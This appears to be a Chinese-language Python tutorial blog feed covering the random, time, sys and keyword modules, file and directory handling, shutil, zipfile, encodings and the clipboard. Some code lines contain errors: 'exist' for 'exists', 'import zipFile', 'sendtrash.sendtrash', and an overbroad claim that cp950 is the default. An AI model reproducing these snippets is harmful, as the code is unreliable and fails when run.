<p><img src="/2020/10/05/Python-%E6%A8%A1%E5%9D%97/image-20201005112557560.png" alt="image-20201005112557560"></p>
<p>庄家可以在程序启动时先设定赢的比率。第2个关键点是程序产生的随机数，由1～100的随机数决定玩家是赢或输，猜大小只是幌子。例如，庄家刚开始设定赢的机率是80%，相当于如果随机数是在81～100的算玩家赢，如果随机数是1～80算玩家输。</p>
<p><img src="/2020/10/05/Python-%E6%A8%A1%E5%9D%97/image-20201005112801874.png" alt="image-20201005112801874"></p>
<h4 id="choice"><a href="#choice" class="headerlink" title="choice()"></a>choice()</h4><p>这个方法可以在一个列表(list)中随机传回一个元素。</p>
<p>如有一个水果列表，使用choice( )方法随机选取一个水果。</p>
<p><img src="/2020/10/05/Python-%E6%A8%A1%E5%9D%97/image-20201005112940391.png" alt="image-20201005112940391"></p>
<h4 id="shuffle"><a href="#shuffle" class="headerlink" title="shuffle()"></a>shuffle()</h4><p>这个方法可以将列表元素重新排列，扑克牌(Porker)游戏，在发牌前可以使用这个方法将牌打乱重新排列。</p>
<p>如将列表内的扑克牌次序打乱，然后重新排列。</p>
<p><img src="/2020/10/05/Python-%E6%A8%A1%E5%9D%97/image-20201005113123051.png" alt="image-20201005113123051"></p>
<p>执行结果：</p>
<p><img src="/2020/10/05/Python-%E6%A8%A1%E5%9D%97/image-20201005113202439.png" alt="image-20201005113202439"></p>
<h2 id="时间time-模块"><a href="#时间time-模块" class="headerlink" title="时间time()模块"></a>时间time()模块</h2><h4 id="time"><a href="#time" class="headerlink" title="time()"></a>time()</h4><p>time( )方法可以传回自1970年1月1日00:00:00AM以来的秒数。</p>
<p>如计算自1970年1月1日00:00:00AM以来的秒数：</p>
<p><img src="/2020/10/05/Python-%E6%A8%A1%E5%9D%97/image-20201005113510187.png" alt="image-20201005113510187"></p>
<p>执行结果：</p>
<p><img src="/2020/10/05/Python-%E6%A8%A1%E5%9D%97/image-20201005113555999.png" alt="image-20201005113555999"></p>
<h4 id="sleep"><a href="#sleep" class="headerlink" title="sleep()"></a>sleep()</h4><p>sleep( )方法可以让工作暂停，这个方法的参数单位是秒。</p>
<p>如每秒打印一次列表的内容：</p>
<p><img src="/2020/10/05/Python-%E6%A8%A1%E5%9D%97/image-20201005113719219.png" alt="image-20201005113719219"></p>
<p>执行结果：</p>
<p><img src="/2020/10/05/Python-%E6%A8%A1%E5%9D%97/image-20201005113744430.png" alt="image-20201005113744430"></p>
<h4 id="asctime"><a href="#asctime" class="headerlink" title="asctime()"></a>asctime()</h4><p>这个方法会以可以阅读方式列出目前系统时间。</p>
<p>如列出目前系统的时间：</p>
<p><img src="/2020/10/05/Python-%E6%A8%A1%E5%9D%97/image-20201005114056882.png" alt="image-20201005114056882"></p>
<p>执行结果：</p>
<p><img src="/2020/10/05/Python-%E6%A8%A1%E5%9D%97/image-20201005114120954.png" alt="image-20201005114120954"></p>
<h4 id="localtime"><a href="#localtime" class="headerlink" title="localtime()"></a>localtime()</h4><p>这个方法可以返回目前时间的结构数据，所返回的结构可以用索引方式获得个别内容。</p>
<p>使用localtime( )方法列出目前时间的结构数据，同时使用索引列出个别内容。</p>
<p><img src="/2020/10/05/Python-%E6%A8%A1%E5%9D%97/image-20201005114233599.png" alt="image-20201005114233599"></p>
<p>执行结果：</p>
<p><img src="/2020/10/05/Python-%E6%A8%A1%E5%9D%97/image-20201005114337802.png" alt="image-20201005114337802"></p>
<h2 id="系统sys模块"><a href="#系统sys模块" class="headerlink" title="系统sys模块"></a>系统sys模块</h2><p>这个模块可以控制Python Shell窗口信息。</p>
<h4 id="version"><a href="#version" class="headerlink" title="version()"></a>version()</h4><p>这个属性可以列出目前所使用Python的版本信息。</p>
<h4 id="stdin对象"><a href="#stdin对象" class="headerlink" title="stdin对象"></a>stdin对象</h4><p>这是一个对象，stdin是standard input的缩写，是指从屏幕输入（可想成PythonShell窗口），这个对象可以搭配readline( )方法，然后可以读取屏幕输入直到按下Enter键的字符串。</p>
<p>如从屏幕读取8个字符数的应用：</p>
<p><img src="/2020/10/05/Python-%E6%A8%A1%E5%9D%97/image-20201005114656329.png" alt="image-20201005114656329"></p>
<h4 id="stdout对象"><a href="#stdout对象" class="headerlink" title="stdout对象"></a>stdout对象</h4><p>这是一个对象，stdout是standard ouput的缩写，是指从屏幕输出（可想成Python Shell窗口），这个对象可以搭配write( )方法，然后可以从屏幕输出数据。</p>
<p>如使用stdout对象输出内容：</p>
<p><img src="/2020/10/05/Python-%E6%A8%A1%E5%9D%97/image-20201005114745601.png" alt="image-20201005114745601"></p>
<h2 id="keyword-模块"><a href="#keyword-模块" class="headerlink" title="keyword()模块"></a>keyword()模块</h2><p>这个模块有一些Python关键词的功能。</p>
<h4 id="kwlist属性"><a href="#kwlist属性" class="headerlink" title="kwlist属性"></a>kwlist属性</h4><p>这个属性含所有Python的关键词。</p>
<p><img src="/2020/10/05/Python-%E6%A8%A1%E5%9D%97/image-20201005115247148.png" alt="image-20201005115247148"></p>
<p>执行结果：</p>
<p><img src="/2020/10/05/Python-%E6%A8%A1%E5%9D%97/image-20201005115310167.png" alt="image-20201005115310167"></p>
<h4 id="iskeyword"><a href="#iskeyword" class="headerlink" title="iskeyword()"></a>iskeyword()</h4><p>这个方法可以传回参数的字符串是否是关键词，如果是传回True，如果否传回False。</p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-文件读取与写入</title>
    <url>/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/</url>
    <content><![CDATA[<hr>
<a id="more"></a>
<h2 id="文件路径"><a href="#文件路径" class="headerlink" title="文件路径"></a>文件路径</h2><p>文件路径图形如下：</p>
<p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201005121343034.png" alt="image-20201005121343034"></p>
<h4 id="绝对路径与相对路径"><a href="#绝对路径与相对路径" class="headerlink" title="绝对路径与相对路径"></a>绝对路径与相对路径</h4><p>在操作系统中可以使用2种方式表达文件路径。</p>
<p>1.绝对路径：路径从根目录开始表示，以上图为例，其绝对路径为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">D:\Python\ch14\ch14_1.py</span><br></pre></td></tr></table></figure>
<p>2.相对路径：指相对于当前工作目录的路径，若是当前工作目录是D:\Python\ch14，它的相对路径是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ch14_1.py</span><br></pre></td></tr></table></figure>
<p>另外，在操作系统处理文件夹的观念中会使用2个特殊符号“.”和“..”，“.”指的是当前文件夹，“..”指的是上一层文件夹。但是在使用上，当指当前文件夹时也可以省略“.\”。</p>
<h4 id="os模块与os-path模块"><a href="#os模块与os-path模块" class="headerlink" title="os模块与os.path模块"></a>os模块与os.path模块</h4><p>在Python内有关文件路径的模块是os。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import os #导入os模块</span><br></pre></td></tr></table></figure>
<p>在os模块内有另一个常用模块os.path，由于os.path是在os模块内，所以导入os模块后不用再导入os.path模块。</p>
<h4 id="取得当前工作目录"><a href="#取得当前工作目录" class="headerlink" title="取得当前工作目录"></a>取得当前工作目录</h4><p>os模块内的getcwd( )可以取得当前工作目录。</p>
<p>如列出当前工作目录：</p>
<p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006145223242.png" alt="image-20201006145223242"></p>
<p>执行结果：</p>
<p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006145254888.png" alt="image-20201006145254888"></p>
<h4 id="取得绝对路径"><a href="#取得绝对路径" class="headerlink" title="取得绝对路径"></a>取得绝对路径</h4><p>os.path模块的abspath(path)会传回path的绝对路径，通常我们可以使用这个方法将文件或文件夹的相对路径转成绝对路径。</p>
<p>如取得绝对路径的应用：</p>
<p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006145432196.png" alt="image-20201006145432196"></p>
<p>执行结果：</p>
<p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006145456563.png" alt="image-20201006145456563"></p>
<h4 id="传回特定路段的相对路径"><a href="#传回特定路段的相对路径" class="headerlink" title="传回特定路段的相对路径"></a>传回特定路段的相对路径</h4><p>os.path模块的relpath(path, start)会传回从start到path的相对路径，如果省略start，则传回当前工作目录至path的相对路径。</p>
<p>如传回相对路径的应用：</p>
<p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006145653302.png" alt="image-20201006145653302"></p>
<p>执行结果：</p>
<p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006145831779.png" alt="image-20201006145831779"></p>
<h4 id="检查路径的方法exist-isabs-isdir-isfile"><a href="#检查路径的方法exist-isabs-isdir-isfile" class="headerlink" title="检查路径的方法exist/isabs/isdir/isfile"></a>检查路径的方法exist/isabs/isdir/isfile</h4><p>下列是常用的os.path模块方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exist(path)：如果path的文件或文件夹存在传回True，否则传回False。</span><br><span class="line"></span><br><span class="line">isabs(path)：如果path的文件或文件夹是绝对路径传回True，否则传回False。</span><br><span class="line"></span><br><span class="line">isdir(path)：如果path是文件夹传回True，否则传回False。</span><br><span class="line"></span><br><span class="line">isfile(path)：如果path是文件传回True，否则传回False。</span><br></pre></td></tr></table></figure>
<h4 id="文件与目录的操作mkdir-rmdir-remove-chdir"><a href="#文件与目录的操作mkdir-rmdir-remove-chdir" class="headerlink" title="文件与目录的操作mkdir/rmdir/remove/chdir"></a>文件与目录的操作mkdir/rmdir/remove/chdir</h4><p>这几个方法是在os模块内，执行下列操作前先用os.path.exists( )检查是否存在。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir(path)：建立path目录。</span><br><span class="line"></span><br><span class="line">rmdir(path)：删除path目录，限制只能是空的目录。</span><br><span class="line"></span><br><span class="line">remove(path)：删除path文件。</span><br><span class="line"></span><br><span class="line">chdir(path)：将当前工作文件夹改至path。</span><br></pre></td></tr></table></figure>
<h4 id="传回文件路径os-path-join"><a href="#传回文件路径os-path-join" class="headerlink" title="传回文件路径os.path.join( )"></a>传回文件路径os.path.join( )</h4><p>这个方法可以将os.path.join( )参数内的字符串结合为一个文件路径，参数可以有2个到多个。</p>
<p>如使用for循环将一个列表内的文件与一个路径结合：</p>
<p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006150938010.png" alt="image-20201006150938010"></p>
<p>执行结果：</p>
<p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006151000741.png" alt="image-20201006151000741"></p>
<h4 id="获得特定文件的大小"><a href="#获得特定文件的大小" class="headerlink" title="获得特定文件的大小"></a>获得特定文件的大小</h4><p>os.path.getsize( )方法可以获得特定文件的大小。</p>
<p>如获得某个文件的文件大小：</p>
<p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006151159257.png" alt="image-20201006151159257"></p>
<p>执行结果：</p>
<p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006151218139.png" alt="image-20201006151218139"></p>
<h4 id="获得特定工作目录的内容"><a href="#获得特定工作目录的内容" class="headerlink" title="获得特定工作目录的内容"></a>获得特定工作目录的内容</h4><p>os.listdir()方法将以列表方式列出特定工作目录的内容。</p>
<p>如列出特定工作目录所有文件的大小：</p>
<p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006151349241.png" alt="image-20201006151349241"></p>
<p>执行结果：</p>
<p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006151414535.png" alt="image-20201006151414535"></p>
<h4 id="获得特定工作目录内容glob"><a href="#获得特定工作目录内容glob" class="headerlink" title="获得特定工作目录内容glob"></a>获得特定工作目录内容glob</h4><p>Python内还有一个模块可用于列出特定工作目录内容glob，当导入这个模块后可以使用glob方法获得特定工作目录的内容，这个方法最大特色是可以使用通配符“<em>”，例如，可用“</em>.txt”获得所有txt扩展名的文件。</p>
<p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006151603715.png" alt="image-20201006151603715"></p>
<p>执行结果：</p>
<p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006151629769.png" alt="image-20201006151629769"></p>
<h4 id="遍历目录树os-walk"><a href="#遍历目录树os-walk" class="headerlink" title="遍历目录树os.walk( )"></a>遍历目录树os.walk( )</h4><p>在os模块内有提供一个os.walk( )方法可以让我们遍历目录树，这个方法每次执行循环时将传回3个值：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">当前工作目录名称(dirName)。</span><br><span class="line"></span><br><span class="line">当前工作目录底下的子目录列表(sub_dirNames).</span><br><span class="line"></span><br><span class="line">当前工作目录底下的文件列表(fileNames)。</span><br></pre></td></tr></table></figure>
<p>语法格式为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for dirname,sub_dirNames,fileNames in os.walk(&quot;目录路径&quot;)：</span><br><span class="line">                  程序区块</span><br></pre></td></tr></table></figure>
<p>上述dirName, sub_dirNames, fileNames名称可以自行命名，顺序则不可以更改，至于目录路径可以使用绝对地址或相对地址，如果不注明则代表当前工作目录的子目录。</p>
<p>如此目录内容如下:</p>
<p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006152102778.png" alt="image-20201006152102778"></p>
<p>遍历此oswalk目录，同时列出内容:</p>
<p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006152200228.png" alt="image-20201006152200228"></p>
<p>执行结果：</p>
<p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006152229395.png" alt="image-20201006152229395"></p>
<h2 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h2><p>Python处理读取或写入文件首先需将文件打开，然后可以一次读取所有文件内容或是一行一行读取文件内容。Python可以使用open( )函数打开文件，文件打开后会传回文件对象。</p>
<h4 id="读取整个文件read"><a href="#读取整个文件read" class="headerlink" title="读取整个文件read()"></a>读取整个文件read()</h4><p>文件打开后，可以使用read( )读取所打开的文件，使用read( )读取时，所有的文件内容将以一个字符串方式被读取然后存入字符串变量内，只要打印此字符串变量相当于可以打印整个文件内容。</p>
<p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006154553632.png" alt="image-20201006154553632"></p>
<h4 id="with关键词"><a href="#with关键词" class="headerlink" title="with关键词"></a>with关键词</h4><p>Python提供一个关键词with应用在打开文件与建立文件对象时，使用方式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">with open(打开的文件) as 文件对象：</span><br><span class="line">     相关操作</span><br></pre></td></tr></table></figure>
<p>使用这种方式打开文件，最大特色是可以不必在程序中关闭文件，with指令会在结束不需要此文件时自动将它关闭，文件经“with open( ) as文件对象”打开后会有一个文件对象，就可以使用read( )读取此文件对象的内容。</p>
<h4 id="逐行读取文件内容"><a href="#逐行读取文件内容" class="headerlink" title="逐行读取文件内容"></a>逐行读取文件内容</h4><p>Python逐行读取文件内容，可以使用下列循环：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for line in file_obj:  #line和obj取名任意，file_obj是文件对象</span><br><span class="line">     循环相关指令</span><br></pre></td></tr></table></figure>
<h4 id="逐行读取使用readlines"><a href="#逐行读取使用readlines" class="headerlink" title="逐行读取使用readlines( )"></a>逐行读取使用readlines( )</h4><p>使用with关键词配合open( )时，所打开的文件对象当前只在with区块内使用，特别是想要遍历此文件对象时。Python另外有一个方法readlines( )可以逐行读取，同时以列表方式储存，另一个特色是读取时每行的换行字符皆会储存在列表内。</p>
<p>如使用readlines( )逐行读取txt：</p>
<p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006155704715.png" alt="image-20201006155704715"></p>
<h4 id="字符串的替换"><a href="#字符串的替换" class="headerlink" title="字符串的替换"></a>字符串的替换</h4><p>使用Word处理时常常会使用寻找/取代功能，Python也有这个方法可以使新字符串取代旧字符串。</p>
<p>字符串对象.replace(旧字符串, 新字符串) # 在字符串对象内，新字符串将取代旧字符串。</p>
<p>如将“工专”改为“科大”：</p>
<p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006155837575.png" alt="image-20201006155837575"></p>
<h4 id="数据搜寻使用find"><a href="#数据搜寻使用find" class="headerlink" title="数据搜寻使用find( )"></a>数据搜寻使用find( )</h4><p>对于字符串的使用，Python提供一个方法find( )，这个方法除了可以执行数据搜寻以外，如果搜寻到数据还会传回数据的索引位置，如果没有找到则传回-1。使用语法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index &#x3D; S.find(sub,[start,end])</span><br></pre></td></tr></table></figure>
<p>S代表被搜寻的字符串，sub是欲搜寻的字符串，index是如果搜寻到时传回的索引值，start和end代表可以被搜寻字符串的区间，若是省略表示全部搜寻，如果没有找到则传回-1给index。</p>
<h2 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h2><h4 id="将结果写入空文件内"><a href="#将结果写入空文件内" class="headerlink" title="将结果写入空文件内"></a>将结果写入空文件内</h4><p>打开文件open( )函数使用时默认是mode=‘r’读取文件模式，因此如果打开文件是供读取可以省略mode=‘r’。若是要供写入，那么就要设定写入模式mode=‘w’，程序设计时可以省略mode，直接在open( )函数内输入‘w’。如果所打开的文件需要读取和写入可以使用‘r+’。如果所打开的文件不存在open( )会建立该文件对象，如果所打开的文件已经存在，原文件内容将被清空。</p>
<p>输出到文件可以使用write( )方法，语法格式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">文件对象.write(欲输出数据)  #可将数据输出到文件对象</span><br></pre></td></tr></table></figure>
<p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006160430673.png" alt="image-20201006160430673"></p>
<h4 id="写入数值资料"><a href="#写入数值资料" class="headerlink" title="写入数值资料"></a>写入数值资料</h4><p>write( )输出时无法输出数值数据，如果想要使用write( )将数值数据输出，必须使用str( )将数值数据转成字符串数据。</p>
<p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006160556264.png" alt="image-20201006160556264"></p>
<h4 id="附加写入"><a href="#附加写入" class="headerlink" title="附加写入"></a>附加写入</h4><p>附加文件主要是可以将文件输出到所打开的文件末端，当以open( )打开时，需增加参数mode=‘a’或是用‘a’，其实a是append的缩写。用open( )打开文件使用‘a’参数时，如果所打开的文件不存在，Python会打开文件供写入；如果所打开的文件存在，Python在执行写入时不会清空原先的文件内容。</p>
<p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006160717650.png" alt="image-20201006160717650"></p>
<h4 id="shutil模块"><a href="#shutil模块" class="headerlink" title="shutil模块"></a>shutil模块</h4><p>这个模块有提供一些方法可以让我们在Python程序内执行文件或目录的复制、删除、更改位置和更改名称。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import shutil</span><br></pre></td></tr></table></figure>
<p>1.文件拷贝copy()</p>
<p>在shutil模块可以使用copy( )执行文件的复制，语法格式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shutil.copy(源位置，目的位置)</span><br></pre></td></tr></table></figure>
<p>执行前source文件一定要存在否则会产生错误。</p>
<p>2.目录的复制copytree()</p>
<p>copytree( )的语法格式与copy( )相同，只不过这是复制目录，复制时目录底下的子目录或文件也将被复制，此外，执行前目录一定要存在否则会产生错误。</p>
<p>3.文件的移动move()</p>
<p>在shutil模块可以使用move( )执行文件的移动，语法格式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shutil.move(源文件位置，目的文件位置)</span><br></pre></td></tr></table></figure>
<p>可将source文件移动到destination目的位置，执行前source文件一定要存在否则会产生错误，执行后source文件将不再存在。</p>
<p>4.文件名的更改move()</p>
<p>在移动过程如果目的路径含有文件名，则可以达到更改名称的效果。</p>
<p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006161246384.png" alt="image-20201006161246384"></p>
<p>5.目录的移动move()</p>
<p>move( )也可以执行目录的移动，在移动时子目录也将随着移动。</p>
<p>如将当前工作目录的子目录dir37移至D:\Python目录下。</p>
<p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006161409265.png" alt="image-20201006161409265"></p>
<p>6.目录更改名称move()</p>
<p>如果在移动过程目的的目录不存在，此时就可以达到目录更改名称的目的了，甚至路径名称也可能更改。</p>
<p>如将当前子目录dir38移动并改名为out38：</p>
<p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006161539283.png" alt="image-20201006161539283"></p>
<p>7.删除有数据的目录rmtree( )</p>
<p>os模块的rmdir( )只能删除空的目录，如果要删除含数据文件的目录须使用rmtree( )。</p>
<p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006161656882.png" alt="image-20201006161656882"></p>
<h4 id="第三方模块删除send2trash"><a href="#第三方模块删除send2trash" class="headerlink" title="第三方模块删除send2trash( )"></a>第三方模块删除send2trash( )</h4><p>Python内置的shutil模块在删除文件后就无法复原了，当前有一个第三方的模块send2trash，执行删除文件或文件夹后是将被删除的文件放在回收站，如果后悔可以救回。不过在使用此模块前须先下载这个外部模块。可以进入安装Python的文件夹，然后在DOS环境安装此模块，安装指令如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install send2trash</span><br></pre></td></tr></table></figure>
<p>安装完成后就可以使用下列方式删除文件或目录了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import send2trash</span><br><span class="line">sendtrash.sendtrash(文件或文件夹)</span><br></pre></td></tr></table></figure>
<h2 id="文件压缩与解压缩zipFile"><a href="#文件压缩与解压缩zipFile" class="headerlink" title="文件压缩与解压缩zipFile"></a>文件压缩与解压缩zipFile</h2><p>Windows操作系统有提供功能将一般文件或目录压缩，压缩后的扩展名是zip，Python内有zipFile模块也可以将文件或目录压缩以及解压缩。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import zipFile</span><br></pre></td></tr></table></figure>
<h4 id="文件或目录的压缩"><a href="#文件或目录的压缩" class="headerlink" title="文件或目录的压缩"></a>文件或目录的压缩</h4><p>执行文件压缩前首先要使用ZipFile( )方法建立一份压缩后的档名，在这个方法中另外要加上‘w’参数，注明未来是供write( )方法写入。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">filezip &#x3D; zipfile.ZipFile(&#39;out.zip&#39;,&#39;w&#39;) #outzip是存储压缩的结果</span><br></pre></td></tr></table></figure>
<p>fileZip和out.zip皆可以自由设定名称，fileZip是压缩文件对象代表的是out.zip，未来将被压缩的文件数据写入此对象，就可以将结果存入out.zip。虽然ZipFile( )无法执行整个目录的压缩，不过可用循环方式将目录底下的文件压缩，即可达到压缩整个目录的目的。</p>
<p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006162303119.png" alt="image-20201006162303119"></p>
<h4 id="读取zip文件"><a href="#读取zip文件" class="headerlink" title="读取zip文件"></a>读取zip文件</h4><p>ZipFile对象有namelist( )方法可以传回zip文件内所有被压缩的文件或目录名称，同时以列表方式传回此对象。这个传回的对象可以使用infolist( )方法传回各元素的属性，如文件名filename、文件大小file_size、压缩结果大小compress_size、文件时间data_time。</p>
<p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006162448350.png" alt="image-20201006162448350"></p>
<h4 id="解压缩zip文件"><a href="#解压缩zip文件" class="headerlink" title="解压缩zip文件"></a>解压缩zip文件</h4><p>解压缩zip文件可以使用extractall( )方法。</p>
<p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006162535954.png" alt="image-20201006162535954"></p>
<h2 id="认识编码格式encode"><a href="#认识编码格式encode" class="headerlink" title="认识编码格式encode"></a>认识编码格式encode</h2><p>当前为止所谈到的文本文件(.txt)的文件打开有关文件编码部分皆是使用Windows操作系统默认方式，文本模式下常用的编码方式有utf-8和cp950。使用open( )打开文件时，可以增加另一个常用的参数encoding，整个open( )的语法将如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file_obj &#x3D; open(file,mode&#x3D;&#39;r&#39;,encoding&#x3D;&quot;utf-8&quot;)</span><br></pre></td></tr></table></figure>
<h4 id="记事本默认的编码"><a href="#记事本默认的编码" class="headerlink" title="记事本默认的编码"></a>记事本默认的编码</h4><p>中文Windows操作系统记事本默认的编码是ANSI，在这个编码格式下，在Python的open( )内我们可以使用预设的encoding=“cp950”编码，因为这是Python预设所以我们可以省略此参数。</p>
<h4 id="utf-8编码"><a href="#utf-8编码" class="headerlink" title="utf-8编码"></a>utf-8编码</h4><p>utf-8英文全名是8-bit Unicode Transformation Format，这是一种适合多语系的编码规则，主要方法是使用可变长度字节方式储存字符，以节省内存空间。</p>
<p>这种编码规则已经包含了全球所有语言的字符了，所以采用这种编码方式设计网页时，其他国家的浏览器只要支持utf-8编码皆可显示。</p>
<p>utf-8是国际通用的编码，如果你使用Linux或Max OS，一般也是用国际编码，所以如果打开文件发生错误，请先检查文件的编码格式。</p>
<p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006163020610.png" alt="image-20201006163020610"></p>
<h2 id="剪切板"><a href="#剪切板" class="headerlink" title="剪切板"></a>剪切板</h2><p>剪贴板的功能是属第三方pyperclip模块内，使用前需使用下列方式安装此模块。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install pyperclip</span><br></pre></td></tr></table></figure>
<p>然后程序前面导入pyperclip模块功能:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import pyperclip</span><br></pre></td></tr></table></figure>
<p>安装完成后就可以使用下列两个方法：</p>
<ol>
<li>copy( )：可将列表数据复制至剪贴板。</li>
<li>paste( )：将剪贴板数据复制回字符串变量.。</li>
</ol>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-异常处理</title>
    <url>/2020/10/06/Python-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/</url>
    <content><![CDATA[<hr>
<a id="more"></a>
<h2 id="程序异常"><a href="#程序异常" class="headerlink" title="程序异常"></a>程序异常</h2><p>Python提供功能可以让我们捕捉异常和撰写异常处理程序，当发生异常被我们捕捉时会去执行异常处理程序，然后程序可以继续执行。</p>
<h4 id="try-except"><a href="#try-except" class="headerlink" title="try-except"></a>try-except</h4><p>发生异常被捕捉时程序会执行异常处理程序，然后跳开异常位置，再继续往下执行。这时要使用try -except指令，它的语法格式如下：</p>
<p><img src="/2020/10/06/Python-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20201006164108843.png" alt="image-20201006164108843"></p>
<p>执行try:下面的指令，如果正常则跳离except部分，如果指令有错误异常，则检查此异常是否是异常对象所指的错误，如果是代表异常被捕捉了，则执行此异常对象下面的异常处理程序。</p>
